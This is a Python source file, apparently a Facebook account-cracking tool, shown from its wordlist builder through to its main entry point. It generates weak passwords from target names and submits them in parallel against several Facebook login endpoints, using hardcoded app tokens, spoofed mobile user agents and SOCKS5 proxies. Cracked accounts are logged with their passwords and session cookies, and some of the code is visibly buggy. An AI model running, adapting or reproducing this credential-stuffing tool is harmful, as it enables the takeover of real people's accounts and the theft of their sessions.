		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	prints(Panel(f"""     {P2}             MODE PESAWAT 5 DETIK JIKA TIDAK ADA HASIL{M2}!!!!{P2}""",title=f"{H2}{hari_ini}{P2}",width=80,style=f"{warna_warni_rich}"))
	global prog,des
	prog = Progress(TextColumn('{task.description}'),BarColumn(bar_width=35),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
					else:pass
				if 'api' in method:
					pool.submit(api,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'api2' in method:
					pool.submit(api2,idf,pwv)
				elif 'prib' in method:
					pool.submit(prib,idf,pwv,'mbasic.facebook.com')
				elif 'api3' in method:
					pool.submit(api3,idf,pwv)
			else:
					pool.submit(crackmbasic,idf,pwv)
		
		prints(f'{H2} OK : {H2}%s '%(ok))
		#prints(f'{M2} 2F : {M2}%s '%(twf))
		prints(f'{J2} CP : {J2}%s '%(cp))
		


#--------------------[ METODE-MOBILE ]-----------------#
			
def UserAgentBase():
	rr = random.randint; rc = random.choice
	fban = random.choice(['AndroidSampleApp','TalkForAndroidNative','MobileAdsManagerAndroid','PAAA','CreatorStudioForAndroid','MessengerLite'])
	fbpn = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
	fbcr = random.choice(['INDOSAT','AXIS','XL Axiata'])
	fbmf = random.choice(['Xiaomi','Oppo','samsung','Google','Asus','Vivo'])
	toddd1 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(6,13))}; POCO X3 NFC MIUI/V12.0.10.0.QJGMIXM) [FBAN/Orca-Android;FBAV/{str(rr(40,200))}.0.0.12.14;FBLC/in_ID;FBBV/4624710;FBCR/Axis;FBMF/Xiaomi;FBBD/POCO;FBDV/POCO X3 NFC;FBSV/{str(rr(40,375))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;]"
	return toddd1

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'[deep_white]{str(loop)}/{len(id)}[/] OK : [green]{len(ok)}[/] CP : [yellow]{len(cp)}[/]')
	prog.advance(des)
	ua = UserAgnetBase()
	try:
		for pw in pwv:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.9/dialog/oauth/?platform=facebook&client_id=1862952583919182&response_type=token&redirect_uri=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F&state=%7B%22client_id%22%3A%221862952583919182%22%2C%22network%22%3A%22facebook%22%2C%22display%22%3A%22popup%22%2C%22callback%22%3A%22_hellojs_7q9rily9%22%2C%22state%22%3A%22%22%2C%22redirect_uri%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%22%2C%22scope%22%3A%22basic%22%7D&scope=public_profile&auth_type=reauthenticate&display=popup h2","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="101", "Google Chrome";v="111", "Not;A=Brand";v="110"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'none','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok=+1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				prints(f'\r├── Email  : {H2}{idf}{P2}          \n│   └──  sandi  : {H}{pw}          {P}\n└──  Cookie : {H2}{coki2}{P}\n         {P}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp=+1
				prints(f"\r├── ID/PW : {J2}{idf}|{pw}         ")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		loop +=1
	except requests.exceptions.ConnectionError:		
		time.sleep(32)


	###----------[ METODE API ]---------- ###
def api(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f' [white]{(loop)}/{m}{len(id)}{P}[/] {H2}OK[/]:{H2}{(ok)} [/]={J2} CP[/]:{J2}{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	try:
		for pw in pwv:
			params = {
				"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				"sdk_version": {random.randint(1,26)}, 
				"email": idf,
				"locale": "en_US",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "62f8ce9f74b12f84c123cc23437a4a32"
			}
			headers = { 
			        "method": "auth.login",
			        "Host": "b-graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "GOOD",
					"user-agent": Session().generate_ugent(),
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
			post = ses.post("https://b-graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
			if "session_key" in post.text and "EAA" in post.text:
				ok+=1
				coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
				prints(f'{H2}[VYEX-OK] {H2} {idf}|{pw} {P2}\n{H2}{coki}')
				open(f"OK/{hari_ini}.txt","a").write(f"{idf}|{pw}|{coki}\n")
				break
			elif "User must verify their account" in post.text:
				cp+=1
				prints(f"{J2}[VYEX-CP] {idf}|{pw}{P2} ")
				open(f"CP/{hari_ini}.txt","a").write(f"{idf}|{pw}")
				break
			else:continue
	except requests.exceptions.ConnectionError:
		time.sleep(30)
		#api(idf,pwv)
	loop+=1



#------------------------------------[ DATA-DATA ]------------------------------------#
Uuid : str(uuid.uuid4())
version_ = str(random.randint(7,13))
model_ = "Infinix"
brand_name_ = "Infinix"
width_ = "720"
height_ = "1280"
uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
adid = str(uuid.uuid4())
abhi = "5531728|62f8ce9"

def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f' [deep_white]{str(loop)}/{len(id)}[/] OK : [green]{len(ok)}[/] CP : [yellow]{len(cp)}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	uuid : str(uuid.uuid4())
	try:
		for pw in pwv:
			head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
			data = "adid="+adid+"&email="+idf+"&password="+pw+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
			po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
			if 'session_key' in po:
				ok+=1
				prints(f" {H2}[Vyex-OK] {idf}|{pw}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			elif 'Please Confirm Email' in po:
				cp+=1
				prints(f" {J2}[Vyex-CP] {idf}|{pw}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		sleep(32)

def prib(idf,pwv,url):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'[white]{url} {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxy= {'http': 'socks5://'+nip}
			ua = random.choice(ugen)
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=1705914966164020&kid_directed_site=0&app_id=1705914966164020&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1705914966164020%26redirect_uri%3Dhttps%253A%252F%252Fid.000webhost.com%252Fcpanel-login%252Foauth%252Ffacebook%26scope%3Demail%252C%2Bpublic_profile%26state%3DHA-9OZF0ISP1B7XA4WNVEKLTJMQ2GR3H5UC68DY%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D22266789-3f9d-4a48-beda-f0032a52ae27%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.000webhost.com%2Fcpanel-login%2Foauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-9OZF0ISP1B7XA4WNVEKLTJMQ2GR3H5UC68DY%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login.php?skip_api_login=1&api_key=1705914966164020&kid_directed_site=0&app_id=1705914966164020&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1705914966164020%26redirect_uri%3Dhttps%253A%252F%252Fid.000webhost.com%252Fcpanel-login%252Foauth%252Ffacebook%26scope%3Demail%252C%2Bpublic_profile%26state%3DHA-9OZF0ISP1B7XA4WNVEKLTJMQ2GR3H5UC68DY%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D22266789-3f9d-4a48-beda-f0032a52ae27%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.000webhost.com%2Fcpanel-login%2Foauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-9OZF0ISP1B7XA4WNVEKLTJMQ2GR3H5UC68DY%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1705914966164020&auth_token=4bbea4a1ffa14c24146f882b3d40d405&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1705914966164020%26redirect_uri%3Dhttps%253A%252F%252Fid.000webhost.com%252Fcpanel-login%252Foauth%252Ffacebook%26scope%3Demail%252C%2Bpublic_profile%26state%3DHA-F1LTY0UJXZ6I9DMSN5WPG8OCQE7AHB42RKV3%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd96528e0-a0ba-4cbf-affc-66d5919aa4c9%26tp%3Dunspecified&refsrc=deprecated&app_id=1705914966164020&cancel=https%3A%2F%2Fid.000webhost.com%2Fcpanel-login%2Foauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-F1LTY0UJXZ6I9DMSN5WPG8OCQE7AHB42RKV3%23_%3D_&lwv=100",data=date, headers=head,proxies=proxy)
			if "checkpoint" in ses.cookies.get_dict():
				prints(f' {J2}[Vyex-CP] {idf}|{pw}')
				cp+=1
				open(f"CP/{hari_ini}.txt","a").write(f"{idf}|{pw}\n")
				break
			elif "c_user" in ses.cookies.get_dict():
				cooz = ses.cookies.get_dict()
				kuki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
				prints(f' {H2}[Vyex-OK]\n{H2} {idf}|{pw}\n{J2}{kuki}')
				ok+=1
				open(f"OK/{hari_ini}.txt","a").write(f"{idf}|{pw}|{kuki}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
###----------[ BAGIAN SESSION HEADERS DAN USER AGENT ]---------- ###
class Session:
	
	###----------[ GENERATE USER AGENT CRACK ]---------- ###
	def generate_ugent(self):
		versi_android = random.randint(4,12)
		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		versi_app = random.randint(410000000,499999999)
		density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{versi_chrome}.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/{versi_app};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{str(random.randint(4,10))};FBCA/armeabi-v7a:armeabi;FBDM/"+str(density)+""
		return ugent

#------------------[ METHODE-FREE-FB ]-------------------#              
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
	


#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> GITHUB.COM/vyrexc<<<<<#
